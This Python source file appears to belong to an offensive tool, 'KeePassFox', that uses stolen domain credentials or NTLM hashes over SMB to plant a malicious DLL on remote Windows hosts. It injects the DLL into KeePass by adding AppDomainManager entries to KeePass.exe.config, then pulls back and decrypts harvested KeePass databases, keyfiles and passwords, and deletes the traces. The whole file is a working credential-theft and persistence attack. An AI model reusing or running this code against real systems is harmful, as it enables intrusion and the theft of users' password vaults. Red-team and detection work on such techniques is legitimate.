from platform import platform
from impacket.smbconnection import SMBConnection, SessionError
from impacket import smb
from crypto import Crypto
from shutil import copy
from os import path
from lxml import etree

import time
import logging
import platform
import subprocess
from io import BytesIO


class KeePassFox:
    def __init__(
        self,
        domain: str,
        username: str,
        password: str,
        lmhash: str,
        nthash: str,
        aesKey: str,
        useKerberos: bool,
        dc_ip: str | None,
        tempDir: str,
        share: str,
        path: str,
    ) -> None:
        self.domain = domain
        self.username = username
        self.password = password
        self.lmhash = lmhash
        self.nthash = nthash
        self.aesKey = aesKey
        self.useKerberos = useKerberos
        self.dc_ip = dc_ip
        self.tempDir = tempDir
        self.share = share
        self.path = path

    def AppDomainInjection(self, host: str) -> bool:
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        # Let's check if the temporary directory has already been created
        tempPath = f"Windows\\Temp\\{self.tempDir}"

        try:
            smbClient.createDirectory("C$", f"{tempPath}")
        except SessionError as e:
            if e.getErrorCode() == 0xC0000035:
                # STATUS_OBJECT_NAME_COLLISION, occurs if the directory already exists
                logging.warning(
                    f"Temporary directory already exists, assuming it is ok."
                )
            else:
                logging.error(f"Error while creating C:\\{tempPath} ")
                return

        # Check if we have already created the proxy dll
        if (
            not path.exists(
                path.join(
                    path.dirname(__file__),
                    "cache",
                    "KeePassManager.dll",
                )
            )
            or not path.exists(
                path.join(
                    path.dirname(__file__),
                    "cache",
                    "libsodium.dll",
                )
            )
            or not path.exists(
                path.join(
                    path.dirname(__file__),
                    "cache",
                    "Sodium.Core.dll",
                )
            )
        ):
            # Let's build our proxy dll, using msbuild
            # First, restore nuget packages

            msbuild_path = path.abspath(
                path.join(path.dirname(__file__), "..", "keepassfox")
            )

            if platform.system() == "Windows":
                with open(
                    path.abspath(
                        path.join(
                            path.dirname(__file__), "..", "keepassfox", "output.path"
                        )
                    ),
                    "w",
                ) as f:
                    f.write(f"C:\\{tempPath}\\keepass.")

                # Now build
                cmd = [
                    "msbuild",
                    "-t:Restore",
                    # /property:Configuration=Release
                ]

                subprocess.run(cmd, cwd=msbuild_path)

            else:
                cmd = [
                    "nuget",
                    "restore",
                    "./KeePassFox.sln",
                    "-source",
                    "https://www.nuget.org/api/v2",
                ]
                subprocess.run(cmd, cwd=msbuild_path)

                with open(
                    path.abspath(
                        path.join(
                            path.dirname(__file__), "..", "keepassfox", "output.path"
                        )
                    ),
                    "w",
                ) as f:
                    f.write(f"C:\\{tempPath}\\keepass.")

                # Now build
                cmd = [
                    "msbuild",
                    # /property:Configuration=Release
                ]

                subprocess.run(cmd, cwd=msbuild_path)

            copy(
                path.abspath(
                    path.join(
                        path.dirname(__file__),
                        "..",
                        "keepassfox",
                        "bin",
                        "Debug",
                        # "Release",
                        "KeePassManager.dll",
                    )
                ),
                path.abspath(
                    path.join(path.dirname(__file__), "cache", "KeePassManager.dll")
                ),
            )

            copy(
                path.abspath(
                    path.join(
                        path.dirname(__file__),
                        "..",
                        "keepassfox",
                        "packages",
                        "libsodium.1.0.17.1",
                        "runtimes",
                        "win-x64",
                        "native",
                        "libsodium.dll",
                    )
                ),
                path.abspath(
                    path.join(path.dirname(__file__), "cache", "libsodium.dll")
                ),
            )

            copy(
                path.abspath(
                    path.join(
                        path.dirname(__file__),
                        "..",
                        "keepassfox",
                        "bin",
                        "Debug",
                        # "Release",
                        "Sodium.Core.dll",
                    )
                ),
                path.abspath(
                    path.join(path.dirname(__file__), "cache", "Sodium.Core.dll")
                ),
            )

        # Let's retreive the dotnet framework config file
        try:
            configData = BytesIO()
            smbClient.getFile(
                self.share, f"{self.path}/KeePass.exe.config", configData.write
            )
        except SessionError:
            logging.error(
                f"[{host}] Failed opening/reading {self.share}\\{self.path}\\KeePass.exe.config"
            )
            return

        data = configData.getvalue()
        xmlElement = etree.fromstring(data)
        if xmlElement == None:
            logging.error(f"Failed parsing KeePass config file on {host}")
            return False

        runtimeElement = xmlElement.find(".//runtime")
        if runtimeElement == None:
            logging.error(
                f"[{host}] KeePass config file does not have a runtime attribute ? Aborting."
            )
            return False

        if (
            runtimeElement.find(".//appDomainManagerAssembly") != None
            or runtimeElement.find(".//appDomainManagerType") != None
        ):
            logging.warning(
                f"[{host}] AppDomainManager already specified in config file, assuming injection already performed, skipping."
            )
            return False

        runtimeElement.append(
            etree.Element(
                "appDomainManagerAssembly",
                # This is the name of the DLL on disk
                attrib={
                    "value": "KeePassManager, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null"
                },
            )
        )
        runtimeElement.append(
            # Name of the .NET class of our injected DLL that inherits AppDomainManager.
            etree.Element("appDomainManagerType", attrib={"value": "KeePassFoxManager"})
        )

        etree.cleanup_namespaces(xmlElement)

        uploadConfig = etree.tostring(
            xmlElement, xml_declaration=True, encoding="utf-8"
        )

        # Get our DLL data
        with open(
            path.abspath(
                path.join(path.dirname(__file__), "cache", "KeePassManager.dll")
            ),
            "rb",
        ) as f:
            dllDataToUpload = f.read()

        # Upload our app domain manager dll
        uploadData = BytesIO(dllDataToUpload)
        try:
            smbClient.putFile(
                self.share, f"{self.path}\\KeePassManager.dll", uploadData.read
            )
        except SessionError as e:
            logging.error(
                f"[{host}] Failed uploading AppDomain Manager to {self.share}\\{self.path}"
            )
            logging.error(e)
            return

        # We also need sodium.dll

        with open(
            path.join(
                path.dirname(__file__),
                "cache",
                "libsodium.dll",
            ),
            "rb",
        ) as f:
            dllDataToUpload = f.read()

        # Upload our app domain manager dll
        uploadData = BytesIO(dllDataToUpload)
        try:
            smbClient.putFile(
                self.share, f"{self.path}\\libsodium.dll", uploadData.read
            )
        except SessionError as e:
            logging.error(
                f"[{host}] Failed uploading libsodium.dll {self.share}\\{self.path}"
            )
            logging.error(e)
            return

        # and Sodium.Core.dll

        with open(
            path.abspath(path.join(path.dirname(__file__), "cache", "Sodium.Core.dll")),
            "rb",
        ) as f:
            dllDataToUpload = f.read()

        # Upload our app domain manager dll
        uploadData = BytesIO(dllDataToUpload)
        try:
            smbClient.putFile(
                self.share, f"{self.path}\\Sodium.Core.dll", uploadData.read
            )
        except SessionError as e:
            logging.error(
                f"[{host}] Failed uploading Sodium.Core.dll {self.share}\\{self.path}"
            )
            logging.error(e)
            return

        # Finally, upload KeePass.exe.config
        uploadData = BytesIO(uploadConfig)
        try:
            smbClient.putFile(
                self.share, f"{self.path}\\KeePass.exe.config", uploadData.read
            )
        except SessionError as e:
            logging.error(
                f"[{host}] Failed uploading KeePass.exe.Config to {self.share}\\{self.path}"
            )
            logging.error(e)
            return

        print(f"[{host}] Sucessfully performed AppDomainInjection for KeePass")
        return True

    def cleanup(self, host: str) -> bool:
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        # Let's retreive the dotnet framework config file
        try:
            configData = BytesIO()
            smbClient.getFile(
                self.share, f"{self.path}/KeePass.exe.config", configData.write
            )
        except SessionError:
            logging.error(
                f"[{host}] Failed opening/reading {self.share}\\{self.path}\\KeePass.exe.config"
            )
            return

        data = configData.getvalue()
        xmlElement = etree.fromstring(data)
        if xmlElement == None:
            logging.error(f"[{host}] Failed parsing KeePass config file")
            return False

        runtimeElement = xmlElement.find(".//runtime")
        if runtimeElement == None:
            logging.error(
                f"[{host}] KeePass config file does not have a runtime attribute ? Aborting."
            )
            return False

        appDomainManagerAssembly = runtimeElement.find(".//appDomainManagerAssembly")
        appDomainManagerType = runtimeElement.find(".//appDomainManagerType")

        if appDomainManagerAssembly == None or appDomainManagerType == None:
            logging.info(
                f"[{host}] KeePass config file does not have both appDomainManagerAssembly and appDomainManagerType. It is already clean"
            )

        else:
            runtimeElement.remove(appDomainManagerType)
            runtimeElement.remove(appDomainManagerAssembly)

            etree.cleanup_namespaces(xmlElement)

            uploadConfig = etree.tostring(
                xmlElement, xml_declaration=True, encoding="utf-8"
            )

            uploadData = BytesIO(uploadConfig)
            try:
                smbClient.putFile(
                    self.share, f"{self.path}\\KeePass.exe.config", uploadData.read
                )
            except SessionError as e:
                logging.error(
                    f"[{host}] Failed cleaning up KeePass.exe.Config to {self.share}\\{self.path}"
                )
                logging.error(e)
                return False

        try:
            smbClient.deleteFile(self.share, f"{self.path}\\KeePassManager.dll")
        except SessionError as e:
            error_code = e.getErrorCode()
            if (
                error_code == 0xC0000043 or error_code == 0xC0000121
            ):  # STATUS_SHARING_VIOLATION or STATUS_CANNOT_DELETE
                logging.warning(
                    f"[{host}] Failed cleaning up KeePassManager.dll from {self.share}\\{self.path}. It is probably in use."
                )
            elif error_code == 0xC0000034:
                logging.info(
                    f"[{host}] Did not find KeePassManager.dll in {self.share}\\{self.path}. It is probably already cleaned."
                )
            else:
                logging.error(
                    f"[{host}] Failed cleaning up KeePassManager.dll from {self.share}\\{self.path}."
                )
                logging.error(e)

        try:
            smbClient.deleteFile(self.share, f"{self.path}\\Sodium.Core.dll")
        except SessionError as e:
            if (
                e.getErrorCode() == 0xC0000043 or e.getErrorCode() == 0xC0000121
            ):  # STATUS_SHARING_VIOLATION or STATUS_CANNOT_DELETE
                logging.warning(
                    f"[{host}] Failed cleaning up Sodium.Core.dll from {self.share}\\{self.path}. It is probably in use."
                )
            elif error_code == 0xC0000034:
                logging.info(
                    f"[{host}] Did not find KeePassManager.dll in {self.share}\\{self.path}. It is probably already cleaned."
                )
            else:
                logging.error(
                    f"[{host}] Failed cleaning up Sodium.Core.dll from {self.share}\\{self.path}."
                )
                logging.error(e)

        try:
            smbClient.deleteFile(self.share, f"{self.path}\\libsodium.dll")
        except SessionError as e:
            if (
                e.getErrorCode() == 0xC0000043 or e.getErrorCode() == 0xC0000121
            ):  # STATUS_SHARING_VIOLATION or STATUS_CANNOT_DELETE
                logging.warning(
                    f"[{host}] Failed cleaning up libsodium.dll from {self.share}\\{self.path}. It is probably in use."
                )
            elif error_code == 0xC0000034:
                logging.info(
                    f"[{host}] Did not find KeePassManager.dll in {self.share}\\{self.path}. It is probably already cleaned."
                )
            else:
                logging.error(
                    f"[{host}] Failed cleaning up libsodium.dll from {self.share}\\{self.path}."
                )
                print(hex(e.getErrorCode()))
                logging.error(e)

        print(f"[{host}] KeePass.exe cleanup complete !")

    def collect(self, host, box: Crypto):
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        try:
            filesInConfigDirectory: list[smb.SharedFile] = smbClient.listPath(
                "C$", f"Windows/Temp/{self.tempDir}/*"
            )

            outputFiles = [
                f.get_longname()
                for f in filesInConfigDirectory
                if f.get_longname().startswith("keepass.")
            ]

            for file in outputFiles:
                try:
                    outputData = BytesIO()
                    smbClient.getFile(
                        "C$", f"Windows\\Temp\\{self.tempDir}\\{file}", outputData.write
                    )
                except SessionError:
                    logging.error(
                        f"[{host}] Failed opening/reading C:\\Windows\\Temp\\{file}"
                    )

                if ".keyfile." in file:
                    plaintexts = box.decryptFile(outputData.getvalue(), isFile=True)

                    for index, plaintext in enumerate(plaintexts):
                        with open(
                            path.join(
                                path.dirname(__file__), "output", f"{index}-" + file
                            ),
                            "wb",
                        ) as f:
                            f.write(plaintext)
                elif ".kdbx." in file:
                    plaintexts = box.decryptFile(outputData.getvalue(), isFile=True)

                    for index, plaintext in enumerate(plaintexts):
                        with open(
                            path.join(
                                path.dirname(__file__), "output", f"{index}-" + file
                            ),
                            "wb",
                        ) as f:
                            f.write(plaintext)
                else:
                    plaintexts = box.decryptFile(outputData.getvalue())
                    with open(
                        path.join(
                            path.dirname(__file__),
                            "output",
                            f"keepass-{int(time.time())}.txt",
                        ),
                        "a",
                    ) as f:
                        for plaintext in plaintexts:
                            f.write(plaintext + "\n")

                # Now, let's delete the file one the remote host
                try:
                    smbClient.deleteFile("C$", f"Windows\\Temp\\{self.tempDir}\\{file}")
                except SessionError:
                    logging.error(
                        f"[{host}] Failed deleting C:\\Windows\\Temp\\{self.tempDir}\\{file}"
                    )
                    logging.error(e)
                    continue

        except SessionError as e:
            logging.info(f"[{host}] Failed opening directory C:\\Windows\\Temp")
